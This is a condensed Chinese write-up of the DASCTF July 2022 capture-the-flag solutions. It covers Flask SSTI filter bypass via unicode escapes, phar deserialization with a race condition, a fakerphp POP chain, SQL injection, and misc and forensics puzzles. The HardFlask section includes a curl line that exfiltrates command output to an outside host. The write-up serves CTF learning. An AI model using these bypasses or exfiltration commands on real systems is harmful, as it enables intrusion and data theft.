---
title: DASCTF 2022 7 月赋能赛官方 Write Up
contest: DASCTF
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [ssti-unicode, phar-deser, fakerphp, golang-ssti, ua-spoof, sys-auth-rc4, docker-layer]
attack_chain:
  - HardFlask: unicode 编码绕 SSTI 过滤
  - 盲注外带数据
  - 找 popen 子类(133) 触发命令
  - ezgetshell: phar 反序列化 + 条件竞争
  - NewSer: composer.json 泄露 + fakerphp 引用绕 __wakeup
  - 绝对防御: jsfinder + SQL 注入
  - 听说你是个侦探: 推理破压缩密码
  - 哆来咪: 圆周率索引提取
  - Colorful Strips: YCbCr vs RGB 还原
  - ez_forensics: vmdk+raw 取证
key_payload: SSTI unicode 编码 + phar 反序列化 + 推理密码
one_liner: DASCTF 2022 7 月赋能赛官方 WP，4 Web + 4 Misc + 取证综合。
lesson: 当 SSTI 过滤了 `__class__` 等关键字，unicode 编码 `\u005f\u005f...` 是万能绕法。
quality: high
---

DASCTF 2022 7 月赋能赛官方 WP（来源 ctfiot），4 Web + 4 Misc + 1 取证。

**WEB 1: HardFlask — SSTI 盲注**
过滤列表：`}}, {{, ], [, ], , , +, _, ., x, g, request, print, args, values, input, globals, getitem, class, mro, base, session, add, chr, ord, redirect, url_for, popen, os, read, flag, config, builtins, get_flashed_messages, get, subclasses, form, cookies, headers`。

解法：unicode 编码 `\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f` 替代 `__class__`；用 `{% if ... %}` 代替 `{{ }}`；遍历 0-500 找含 popen 的子类（第 133 个）；外带数据用 `curl 47.xxx.xxx.72:2333 -d "`ls /`"` 触发服务器监听。

**WEB 2: ezgetshell — phar 反序列化 + 条件竞争**
读取功能拿源码 → 审计 Show + Upload → 构造 POP 链 → gzip 压缩改后缀上传 → session 上传进度 + 条件竞争包含。

**WEB 3: NewSer — composer.json 泄露 + fakerphp**
- `composer.json` 泄露部分代码
- User.__destruct → __get 触发 fakerphp Generator.format
- fakerphp Generator.__get → call_user_func_array
- 但 Generator.__wakeup 会清空 formatters，需要 PHP 引用绕
- ValidGenerator 类的 __get → __call 不需要绕 wakeup，但有过滤

**WEB 4: 绝对防御 — jsfinder + SQL 注入**
jsfinder 找 SUPPSERAPI.php；id 参数加空格绕前端限制；waf 之外传参拿 flag。

**MISC 1: 听说你是个侦探 — 推理**
17 房间 17 人物 + 25 线索 + 死亡顺序；密文 `ICYBETRAYALS` md5 = `6991cbf525f0cbf574c609f7d9d30222` 是压缩密码；解后图片 hex 拼接得 `dasctf{you~are-A-careful_People}`。

**MISC 2: 哆来咪发唆拉西哆 — 圆周率索引**
PDF 末尾有 zip，提取后数字组是圆周率索引（4 个一组取每位置的数字 = jpg 字节）；最后 30 位是 flag：`DASCTF{141592653589793238462643383279}`。

**MISC 3: Colorful Strips — YCbCr vs RGB**
YCbCr(126, 85, 255) → RGB(304, 50, 50) (R > 255 截断到 255 同样颜色)；turbojpeg 解码 yuv planes 还原图像。

**MISC 4: ez_forensics — vmdk+raw**
`volatility -f pc.raw --profile=Win7SP1x64 cmdscan` 找命令；`screenshot` 找截屏；`filescan | grep thes3cret` 找文件；FTK 挂 vmdk 解 BitLocker。
